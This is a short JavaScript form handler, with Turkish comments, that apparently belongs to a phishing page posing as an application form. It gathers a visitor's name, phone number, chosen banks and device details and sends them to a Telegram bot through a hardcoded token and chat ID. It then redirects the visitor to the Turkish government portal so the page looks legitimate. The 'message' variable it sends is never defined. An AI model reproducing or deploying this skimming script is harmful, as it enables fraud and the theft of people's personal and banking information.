document.getElementById('application-form').addEventListener('submit', function(event) {
    event.preventDefault();  // Formun sayfayı yeniden yüklemesini engelle

    // Form verilerini toplama
    const name = document.getElementById('name').value;
    const phone = document.getElementById('phone').value;
    const selectedBanks = [];
    document.querySelectorAll('#bank input[type="checkbox"]:checked').forEach((checkbox) => {
        selectedBanks.push(checkbox.value);
    });

    // Cihaz bilgisi (basit bir örnek)
    const device = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobil' : 'Masaüstü';

    // IP Adresi ve Cihaz Bilgisi
    const ip = "IP_VERİSİ"; // Gerçek IP almak için backend kullanmanız gerekebilir
    const deviceInfo = navigator.userAgent;


    // Telegram API'ye gönderme
    const telegramChatId = "6741536025";
    const telegramBotToken = "7629670888:AAEqZzPWacVXUrbcP36nRtYYzpJmmWrImcw";

    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: telegramChatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Telegram API başarıyla gönderildi', data);
    })
    .catch(error => {
        console.error('Telegram API hatası:', error);
    });

    // Başvuru mesajını göster
    document.getElementById('confirmation-message').classList.remove('hidden');
    
    // 5 saniye sonra yönlendirme
    setTimeout(function() {
        window.location.href = 'https://www.turkiye.gov.tr/';
    }, 5000);
});
